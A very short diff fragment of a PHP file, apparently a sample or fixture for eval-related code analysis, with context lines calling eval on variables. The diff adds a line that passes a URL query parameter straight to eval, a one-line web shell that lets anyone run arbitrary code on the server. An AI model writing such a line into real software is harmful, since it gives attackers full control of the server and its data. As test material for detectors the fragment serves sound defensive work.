@@ -4,3 +4,5 @@ eval($a);
 
 $b = $a;
 eval($b);
+
+eval($_GET["x"]);
